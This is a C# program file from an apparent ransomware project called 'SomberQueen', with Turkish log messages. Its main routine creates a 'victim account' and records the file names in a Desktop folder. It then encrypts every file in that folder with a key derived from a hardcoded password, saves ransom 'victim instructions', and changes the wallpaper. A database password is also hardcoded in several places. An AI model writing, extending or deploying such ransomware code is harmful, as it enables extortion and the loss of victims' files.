using System;
using SomberQueen.Services;
using SomberQueen.Utilities;
using System.IO;

namespace SomberQueen
{
    public class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Logger.WriteLog("Uygulama başlatılıyor...");

                if (!TestDatabaseConnection())
                {
                    Logger.WriteLog("Veritabanı bağlantısı başarısız.");
                    return;
                }

                TestUserAndEncryption();

                string wallpaperPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "wallpaper.jpg");

                if (File.Exists(wallpaperPath))
                {
                    Wallpaper.SetWallpaper(wallpaperPath);
                    Logger.WriteLog("Masaüstü arka planı başarıyla değiştirildi.");
                }
                else
                {
                    Logger.WriteLog("Wallpaper dosyası bulunamadı.");
                }


                Logger.WriteLog("Uygulama başarıyla tamamlandı.");
            }
            catch (Exception ex)
            {
                string logFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "error.log");
                File.AppendAllText(logFilePath, $"{DateTime.UtcNow}: {ex.Message}\n");
                Logger.WriteLog($"Bir hata oluştu: {ex.Message}");
            }
        }

        static bool TestDatabaseConnection()
        {
            Logger.WriteLog("Veritabanı bağlantısı testi başlıyor...");
            string connectionString = "Host=localhost;Port=5432;Database=SomberQueen;Username=postgres;Password=TfxZ.8BPiztV6b";

            var dbHelper = new DBHelper(connectionString);

            if (dbHelper.TestConnection())
            {
                Logger.WriteLog("Veritabanı bağlantısı başarılı.");
                return true;
            }
            else
            {
                Logger.WriteLog("Veritabanı bağlantısı başarısız.");
                return false;
            }
        }

        static void TestUserAndEncryption()
        {
            Logger.WriteLog("Kullanıcı ve şifreleme işlemleri başlıyor...");

            string connectionString = "Host=localhost;Port=5432;Database=SomberQueen;Username=postgres;Password=TfxZ.8BPiztV6b";
            
            var dbHelper = new DBHelper(connectionString);
            var dbService = new DBService(dbHelper);
            var encryptionService = new EncryptionService(dbHelper);
            var userService = new UserService(dbHelper);

            string folderPath = @"C:\Users\metin\OneDrive\Desktop\cry";
            string password = "securepassword";

            byte[] decKey = EncryptionService.GenerateEncryptionKey(password);

            var notificationService = new NotificationService();

            var (username, generatedPassword) = userService.CreateVictimAccount(decKey);
            Logger.WriteLog($"Yeni kurban hesabı oluşturuldu - Kullanıcı adı: {username}");

            dbService.SaveFileNamesToDatabase(folderPath, username);
            Logger.WriteLog("Veritabanı işlemleri tamamlandı.");

            Logger.WriteLog("Şifreleme işlemi başlatılıyor...");
            EncryptionService.EncryptFilesInFolder(folderPath, decKey);
            Logger.WriteLog("Dosya başarıyla şifrelendi");

            notificationService.SaveVictimInstructions(username, generatedPassword);
            Logger.WriteLog("Kullanıcı talimatları dosyaya kaydedildi");
        }

               }

        /*static void TestRedirectLog()
        {

            Guid testUserId = Guid.NewGuid();

            Logger.WriteLog("Yönlendirme işlemleri başlıyor...");

            string connectionString = "Host=localhost;Port=5432;Database=SomberQueen;Username=postgres;Password=TfxZ.8BPiztV6b";
            var dbHelper = new DBHelper(connectionString);
            Logger.WriteLog("gecti");

            var redirectService = new RedirectService(dbHelper);
            Logger.WriteLog("gecti");


            
            redirectService.SaveUserRedirectLog(testUserId, "What Happened? sayfasına yönlendirme.");
            Logger.WriteLog("Yönlendirme logu başarıyla kaydedildi.");
        }*/
    }
}
